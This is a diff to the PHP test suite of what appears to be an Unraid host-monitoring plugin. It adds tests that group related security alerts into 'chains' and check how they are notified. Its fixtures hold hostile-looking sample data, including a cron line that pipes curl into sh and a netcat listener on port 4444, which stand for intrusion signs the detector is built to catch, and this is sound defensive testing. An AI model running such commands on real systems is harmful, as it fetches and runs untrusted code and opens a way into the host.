@@ -3449,7 +3449,8 @@ function testWatchman(): void
     same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
         [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
     $c = $calls();
-    same('watch: one notification per important kind (ports only in the book)', 12, count($c));
+    same('watch: one notification per important kind (ports only in the book), and one for what may belong together (a new address, then rights, plugins, the flash)', 13, count($c));
+    check('watch: the chain\'s notification', str_contains(implode("\n", $c), officeNotifyText('watchman', 'notify.chain', ['n' => 12], officeNotifyLang())));
     $lang = officeNotifyLang();
     check('watch: the notification in Unraid\'s language',
         str_contains(implode("\n", $c), OFFICE_NOTIFY_EVENT . ': ' . officeNotifyText('watchman', 'notify.login_failures', ['n' => 1] + watchmanText($by['login_failures']), $lang)));
@@ -3462,7 +3463,7 @@ function testWatchman(): void
     // the same again, the burst going on: no new entry, nothing told again
     file_put_contents($paths['syslog'], $line($t + 30, 'sshd[7]: Failed password for root from 203.0.113.9 port 4999 ssh2'), FILE_APPEND);
     $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
-    same('watch: seen again — nothing new, the burst counts on, nobody told twice', [[], 7, 12],
+    same('watch: seen again — nothing new, the burst counts on, nobody told twice', [[], 7, 13],
         [$r['added'], array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), null, 'kind')['login_failures']['count'], count($calls())]);
 
     // «I know, thanks»: one, then the rest — the new normal
@@ -6560,6 +6561,30 @@ function testWatchmanHost(): void
     same('host summary: the known ports with their program, the ways in that are open, how many accounts',
         [[['key' => 'tcp:9100', 'prog' => 'node_exporter', 'port' => 9100, 'addr' => ['*']]], ['wg'], 4],
         [$sum['listen'], array_column($sum['doors'], 'what'), $sum['users']]);
+    // what may belong together: important, not noted, two kinds or more, each within an hour of another
+    $e = fn (string $kind, int $t, ?int $noted = null) => ['id' => 'w' . substr(md5($kind . $t), 0, 10), 'kind' => $kind, 'key' => $kind, 'time' => $t, 'last' => $t,
+        'count' => 1, 'p' => ['ip' => '203.0.113.9', 'users' => ['root'], 'services' => ['ssh:password'], 'lines' => 1, 'jobs' => ['* * * * * curl x|sh'],
+        'prog' => 'nc', 'port' => 4444], 'noted' => $noted, 'by' => null, 'told' => null];
+    $cb = [$e('login_new_ip', $now), $e('cron_new', $now + 600), $e('listen_new', $now + 1500), $e('smb_client', $now + 1600),
+           $e('flash_go', $now + 9000), $e('plugin_new', $now + 20000), $e('cron_new', $now + 20010), $e('listen_new', $now + 20020),
+           $e('container_new', $now + 20100, $now)];
+    $ch = watchmanChains($cb, $now + 21000);
+    same('chains: login, cron line and port within the hour; a plugin with its cron line and port (no way in), not important, alone or noted are none',
+        [1, 3, ['login', 'sched', 'host']], [count($ch), count($ch[0]['ids']), $ch[0]['groups']]);
+    same('chains: damage of two sorts — snapshots gone and much written', 1,
+        count(watchmanChains([$e('snap_gone', $now), $e('flow_written', $now + 300)], $now + 600)));
+    $cst = ['notify' => true];
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify-stand-in");
+    file_put_contents("$tmp/notify-stand-in", "#!/bin/sh\necho \"\$@\" >> " . escapeshellarg("$tmp/notified") . "\n");
+    chmod("$tmp/notify-stand-in", 0755);
+    $t1 = watchmanChainsDue($cb, $cst, $now + 21000, true, 'en');
+    $t2 = watchmanChainsDue($cb, $cst, $now + 21300, true, 'en');
+    same('chains: told once when it forms, not again', [[['kind' => 'chain', 'n' => 3, 'sent' => true]], []], [$t1, $t2]);
+    check('chains: the message names it', str_contains((string) @file_get_contents("$tmp/notified"), '3 entries that may belong together'));
+    $off = ['notify' => false];
+    same('chains: with the reports off never told, also not later', [[], []],
+        [watchmanChainsDue($cb, $off, $now + 21000, true, 'en'), watchmanChainsDue($cb, array_merge($off, ['notify' => true]), $now + 21300, true, 'en')]);
+    putenv('OFFICE_NOTIFY_BIN');
     same('attack: every kind has its technique, in ATT&CK\'s shape', [[], []],
         [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK))),
          array_values(array_filter(WATCH_ATTACK, fn ($t) => !preg_match('/^T\d{4}(\.\d{3})?$/D', $t)))]);
